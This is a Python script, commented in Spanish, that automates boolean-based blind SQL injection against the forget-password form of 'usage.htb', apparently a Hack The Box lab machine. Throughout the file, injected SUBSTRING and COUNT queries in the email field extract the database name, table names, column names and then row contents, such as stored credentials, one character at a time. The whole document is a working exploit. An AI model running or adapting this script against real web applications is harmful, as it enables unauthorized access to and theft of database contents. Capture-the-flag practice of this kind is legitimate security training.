import requests

url = "http://usage.htb/forget-password"
ascii = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z","$","A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z","(", ")", "*", "+", ",", "-", ".", "/","_", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", ":", ";", "<", "=", ">", "?", "]", "^", "{", "|", "}", "~"]

tablas = []

# Headers
def headers():
    cookie = input("Escribe la cookie:\n>> ")    
    headers = {
    "Host": "usage.htb",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Content-Length": "90",
    "Origin": "http://usage.htb",
    "Connection": "keep-alive",
    "Referer": "http://usage.htb/forget-password",
    "Cookie": f"{cookie}",
    "Upgrade-Insecure-Requests": "1"
    }

    return headers


def pedir_token():
    token = input("Escribe el valor del campo 'Token':\n>> ")
    return token


#Descubrimiento de BBDD
def DB_usada(token, cabeceras):
    BBDD = ""
    letra_encontrada = True

    print("\nDescubriendo...")
    for i in range(1, 123121231):
        if letra_encontrada:
            for letra in ascii:
                data = {
                '_token': f'{token}',
                'email': f"darsel@darsel.com\' AND (SELECT SUBSTRING(database(),{i},1))='{letra}'-- -"
                }

                # Peticion POST
                response = requests.post(url, data=data, headers=cabeceras)

                # Respuesta
                letra_encontrada = False
                if "Email address does not match in our records!" not in response.text:
                    print(letra, end='', flush=True)
                    BBDD += letra
                    letra_encontrada = True
                    break

    return BBDD


#Descubrimiento de numero de tablas:
def num_tablas(token, headers, BBDD_usada):

    print("descubriendo...")
    for i in range(1, 100000000):
        data = {
        '_token': f'{token}',
        'email': f"darsel@darsel.com\' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='{BBDD_usada}')={i} -- -" 
        }
        # Peticion POST
        response = requests.post(url, data=data, headers=headers)

        # Respuesta
            
        if "Email address does not match in our records!" not in response.text:
            return i


#Descubrimiento de nombres de tablas:
def nombre_tablas(numero_tabla, headers, token, BBDD_usada):
    
    print("descubriendo...")
    tabla = ""
    
    letra_encontrada = True

    for num_letra in range(1, 500):

        if letra_encontrada == True:

            for char in ascii:
                data = {
                '_token': f'{token}',
                'email': f"darsel@darsel.com\' AND (SELECT SUBSTRING(table_name,{num_letra},1) FROM information_schema.tables WHERE table_schema='{BBDD_usada}' LIMIT {numero_tabla -1},1)='{char}'-- -" 
                }

                # Peticion POST
                response = requests.post(url, data=data, headers=headers)

                # Respuesta

                if "Email address does not match in our records!" not in response.text:
                    print(char, end='', flush=True)
                    tabla += char
                    letra_encontrada = True
                    break
                else:
                    letra_encontrada = False
        else:
            if tabla not in tablas:
                tablas.append(tabla)
            return tabla
        
    if tabla not in tablas:
        tablas.append(tabla)
    return tabla


#Descubrimiento del numero de columnas de una tabla
def numero_columnas(tabla, token, cabeceras, BBDD_usada):

    print("\n\nDescubriendo...")
    for i in range(1, 500):
        
        data = {
        '_token': f'{token}',
        'email': f"darsel@darsel.com\' AND (SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema='{BBDD_usada}' AND table_name='{tabla}')={i} -- -" 
        }

        # Peticion POST
        response = requests.post(url, data=data, headers=cabeceras)

        # Respuesta
            
        if "Email address does not match in our records!" not in response.text:
            return i


#Descubrimiento de las columnas de una tabla
def nombres_columnas(tabla, cantidad, token, cabeceras, BBDD_usada):
    print("descubriendo...")
    columnas = []
    columna = ""
    for num in range(1, cantidad+1):
        print("\n-------------------------------------------------")
        letra_encontrada = True
        for i in range(1, 1000):
                
                if letra_encontrada:

                    for char in ascii:
                        
                        data = {
                            '_token': f'{token}',
                            'email': f"darsel@darsel.com\' AND (SELECT SUBSTRING(column_name,{i},1) FROM information_schema.columns WHERE table_schema='{BBDD_usada}' AND table_name='{tabla}' LIMIT {num},1)='{char}' -- -" 
                            }
                        
                        # Peticion POST
                        response = requests.post(url, data=data, headers=cabeceras)
                        letra_encontrada = False
                        # Respuesta
                        if "Email address does not match in our records!" not in response.text:
                            print(char, end='', flush=True)
                            columna += char
                            letra_encontrada = True
                            break
                else:
                    break
        
        columnas.append(columna)
        columna = ""
    return columnas   

#Encontrar número de entradas
def extraer_datos(columna, tabla, token, cabeceras):
    for i in range(1, 1000000000000):
        data = {
                '_token': f'{token}',
                'email': f"darsel@darsel.com\' AND (SELECT COUNT({columna}) FROM {tabla}) = {i} -- -" 
                }
        # Peticion POST
        response = requests.post(url, data=data, headers=cabeceras)

        if "Email address does not match in our records!" not in response.text:
            return i
        
#Preguntar al usuario    
def preguntar_entradas_columnas( tabla, token, cabeceras, columnas):

    columna = columnas[int(input("Escoge la columna a examinar: (1, 2, 3, 4...)\n>> ")) - 1]
    numero_entradas = extraer_datos(columna, tabla, token, cabeceras)
    print(f"Encontrada/s {numero_entradas} entrada/s en la columna {columna}")

    while input("Quieres examinar otra columna? s/n\n>> ") == "s":
        columna = columnas[int(input("Escoge la columna a examinar: (1, 2, 3, 4...)\n>> ")) - 1]
        numero_entradas = extraer_datos(columna, tabla, token, cabeceras)
        print(f"Encontrada/s {numero_entradas} entrada/s en la columna {columna}")
    
    return numero_entradas



#query = f" AND (SELECT ASCII(SUBSTRING((SELECT {column_name} FROM {table_name} LIMIT 1 OFFSET {row}), {i}, 1))) = {c} --"


def sacar_datos(token, cabeceras, columna, tabla, numeroentradas):
    letra_encontrada = True
    datos = []

    for i in range(1, numeroentradas+1):
        encontrados = ""    
        for posicion in range(1, 1000000):
            if letra_encontrada:
                for char in ascii:
                            
                    data = {
                        '_token': f'{token}',
                        'email': f"darsel@darsel.com\' AND BINARY SUBSTRING((SELECT {columna} FROM {tabla} LIMIT {i}), {posicion}, 1) = '{char}' -- -"
                        }
                        # Peticion POST
                    response = requests.post(url, data=data, headers=cabeceras)
                    # Respuesta
                    letra_encontrada = False

                    if "Email address does not match in our records!" not in response.text:
                        print(char, end='', flush=True)
                        encontrados += char
                        letra_encontrada = True
                        break
        datos.append(encontrados)
    

    print()  # Print a newline character at the end
    return datos


def preguntar_columnas(token, cabeceras, columnas, tabla_escogida):
    columna_escogida = columnas[int(input("Escoge una columna para examinar: (1, 2, 3, 4...)\n>> ")) -1]
    numero_de_entradas = extraer_datos(columna_escogida, tabla_escogida, token, cabeceras)
    print(sacar_datos(token, cabeceras, columna=columna_escogida, tabla=tabla_escogida, numeroentradas=numero_de_entradas))

def main():

    token = pedir_token()
    cabeceras = headers()
    


    #Descubrimiento de la BBDD en uso
    BBDD_usada = DB_usada(token, cabeceras)
    print(f"\nBBDD usada: {BBDD_usada}\n-------------------------------------------------")

    #Descubrimiento del numero de tablas
    print("Descubriendo el número de tablas...")
    cantidad_de_tablas = num_tablas(token, cabeceras, BBDD_usada)
    print(f"\nLa BBDD {BBDD_usada} contiene {cantidad_de_tablas} tablas.\n")

    #Descubrimiento de nombres de tablas
    tablas_escogidas = []
    tabla_escogida = int(input(f"Pasamos a descubrir los nombres de las tablas, selecciona el número de la tabla que quieres probar. (Hay {cantidad_de_tablas} tablas) :\n>> "))
    tablas_escogidas.append(tabla_escogida)
    tabla_encontrada = nombre_tablas(tabla_escogida, cabeceras, token, BBDD_usada)
    print(f"\nTabla encontrada: {tabla_encontrada}")
    print(f"\nTablas encontradas hasta ahora: {tablas}")

    #Repeticion de descubrimiento de nombres de tablas
    while input("\nQuieres continuar descubriendo mas tablas? s/n\n>> ") != "n":
        print(f"Hasta ahora has explorado la/s tabla/s {tablas_escogidas}")
        tabla_escogida = int(input(f"Pasamos a descubrir los nombres de las tablas, selecciona el número de la tabla que quieres probar. (Hay {cantidad_de_tablas} tablas) :\n>> "))
        tablas_escogidas.append(tabla_escogida)
        tabla_encontrada = nombre_tablas(tabla_escogida, cabeceras, token, BBDD_usada)
        print(f"\nTabla encontrada: {tabla_encontrada}")
        print(f"Tablas encontradas hasta ahora: {tablas}")

    
    #Descubrimiento de numero de columnas
    tabla_escogida = tablas[int(input(f"\nPasamos a descubrir las columnas, selecciona el número de la tabla que quieres probar siendo 1 la primera, 2 la segunda... \nTablas descubiertas: {tablas} :\n>> "))-1]
    cantidad_columnas = numero_columnas(tabla_escogida, token, cabeceras, BBDD_usada)
    print(f"La tabla {tabla_escogida} contiene {cantidad_columnas} columnas.")

    
    #Descubrimiento de nombres de columnas
    columnas = nombres_columnas(tabla_escogida, cantidad_columnas, token, cabeceras, BBDD_usada)
    print(f"\nLas columnas de la tabla {tabla_escogida} son:\n{columnas}")

    while input("Quieres sacar datos de alguna columna? s/n\n>> ") != "n":
        preguntar_columnas(token, cabeceras, columnas, tabla_escogida)
    



if __name__ == "__main__": 
    
    tablas = []    
    main()
